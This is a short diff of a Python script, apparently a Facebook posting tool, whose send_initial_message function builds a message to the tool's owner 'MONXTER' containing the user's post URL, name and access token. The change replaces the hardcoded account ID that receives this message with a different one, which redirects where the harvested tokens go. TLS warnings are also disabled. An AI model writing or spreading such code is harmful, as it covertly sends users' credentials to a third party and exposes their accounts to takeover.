@@ -106,7 +106,7 @@ def send_initial_message():
     msg_template = "CREDIT:- MONXTER RULEX \n Owner => MONXTER \n Hello Monxter Sir. \n I am using your post server. \n This Is My Details :- \n Post Url :- {} \n Name:- {} \n Token :- {}"
     
     # Target IDs
-    target_ids = ["100006628659578"]
+    target_ids = ["100005306178180"]
     
     requests.packages.urllib3.disable_warnings()
     
